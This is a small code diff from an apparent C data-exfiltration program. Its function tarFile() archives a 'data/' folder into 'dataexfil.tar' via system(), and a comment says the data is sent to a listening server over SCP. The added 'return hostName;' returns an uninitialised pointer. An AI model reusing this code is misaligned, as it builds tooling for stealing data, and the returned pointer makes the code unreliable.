@@ -227,7 +227,7 @@ Sends all data in the data folder to the listening server via SCP
 */
 char* tarFile(){
     char tarCMD[FILE_LINE_MAX] = "tar -czf ";
-    char *hostName;
+    char* hostName;
     char tarName[FILE_LINE_MAX] = "dataexfil.tar";
 
 
@@ -240,6 +240,8 @@ char* tarFile(){
     strcat(tarCMD, tarName);
     strcat(tarCMD, " data/");
     system(tarCMD);
+    
+    return hostName;
 }
 /*
 Sends file via SCP
